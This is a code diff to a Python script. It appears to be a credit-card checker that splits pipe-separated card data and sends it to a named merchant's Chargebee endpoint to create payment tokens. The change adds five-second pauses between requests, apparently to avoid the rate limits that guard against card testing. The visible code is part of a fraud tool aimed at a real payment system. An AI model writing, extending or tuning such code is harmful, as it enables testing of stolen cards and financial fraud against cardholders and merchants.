@@ -1,5 +1,6 @@
 import requests
 import user_agent
+import time
 def Tele(ccx):
 		ccx=ccx.strip()
 		n = ccx.split("|")[0]
@@ -95,7 +96,7 @@ def Tele(ccx):
 		response = requests.post('https://3plearning.chargebee.com/api/js/v2/tokens/create_using_temp_token', headers=headers, data=data)
 		
 		cd = (response.json()['token']['id'])
-		
+		time.sleep(5)
 		headers = {
 		    'authority': '3plearning.chargebee.com',
 		    'accept': 'application/json, text/plain, */*',
@@ -141,7 +142,7 @@ def Tele(ccx):
 		    headers=headers,
 		    json=json_data,
 		)
-		
+		time.sleep(5)
 		try:
 			ii=(response.text)
 		except:
